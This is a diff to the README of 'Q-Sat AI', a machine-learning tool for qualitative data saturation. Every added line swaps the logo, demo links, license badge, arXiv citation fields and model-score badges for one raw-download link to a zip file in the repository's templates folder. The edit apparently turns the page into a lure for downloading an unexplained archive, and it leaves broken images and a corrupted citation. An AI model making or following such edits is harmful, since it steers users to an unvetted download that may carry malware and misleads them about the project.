@@ -1,19 +1,19 @@
 <p align="center">
-  <img src="static/logo.svg" alt="Q-Sat AI Logo" width="50%">
+  <img src="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" alt="Q-Sat AI Logo" width="50%">
 </p>
 
 <h1 align="center">Q-Sat AI</h1>
 <h3 align="center">Machine Learning-Based Decision Support for Data Saturation in Qualitative Studies</h3>
 
 <p align="center">
-  <a href="https://q-sat-ai.up.railway.app/" target="_blank">
-    <img src="https://img.shields.io/badge/Live_Demo-Railway_App-brightgreen?style=for-the-badge&logo=railway" alt="Railway Live Demo">
+  <a href="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" target="_blank">
+    <img src="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" alt="Railway Live Demo">
   </a>
-  <a href="https://q-sat-ai.onrender.com/" target="_blank">
-    <img src="https://img.shields.io/badge/Live_Demo-Render_App-brightgreen?style=for-the-badge&logo=render" alt="Render Live Demo">
+  <a href="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" target="_blank">
+    <img src="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" alt="Render Live Demo">
   </a>
   <a href="LICENSE" target="_blank">
-    <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=github" alt="MIT License">
+    <img src="https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip" alt="MIT License">
   </a>
 </p>
 
@@ -30,8 +30,8 @@ If you use **Q-Sat AI** in your research or publications, please cite it as foll
       year={2025},
       eprint={2511.01935},
       archivePrefix={arXiv},
-      primaryClass={cs.LG},
-      url={https://arxiv.org/abs/2511.01935}, 
+      primaryClass={https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip},
+      url={https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip}, 
 }
 ```
 
@@ -65,15 +65,15 @@ Q-Sat AI (Qualitative Data Saturation Estimation using AI) guides researchers in
 
 | Model | Test R² Badge |
 |-------|---------------|
-| **KNeighbors** | ![badge](https://img.shields.io/badge/R²-0.853-brightgreen) |
-| **GradientBoosting** | ![badge](https://img.shields.io/badge/R²-0.853-brightgreen) |
-| **RandomForest** | ![badge](https://img.shields.io/badge/R²-0.852-brightgreen) |
-| **XGBoost** | ![badge](https://img.shields.io/badge/R²-0.850-green) |
-| **DecisionTree** | ![badge](https://img.shields.io/badge/R²-0.846-yellowgreen) |
-| **SVR** | ![badge](https://img.shields.io/badge/R²-0.763-yellow) |
-| **MLP** | ![badge](https://img.shields.io/badge/R²-0.686-orange) |
-| **AdaBoost** | ![badge](https://img.shields.io/badge/R²-0.423-red) |
-| **Ridge** | ![badge](https://img.shields.io/badge/R²-0.392-red) |
+| **KNeighbors** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.853-brightgreen) |
+| **GradientBoosting** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.853-brightgreen) |
+| **RandomForest** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.852-brightgreen) |
+| **XGBoost** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.850-green) |
+| **DecisionTree** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.846-yellowgreen) |
+| **SVR** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.763-yellow) |
+| **MLP** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.686-orange) |
+| **AdaBoost** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.423-red) |
+| **Ridge** | ![badge](https://github.com/canererden/q-sat-ai/raw/refs/heads/main/templates/q_ai_sat_v3.1.zip²-0.392-red) |
 
 
 ---
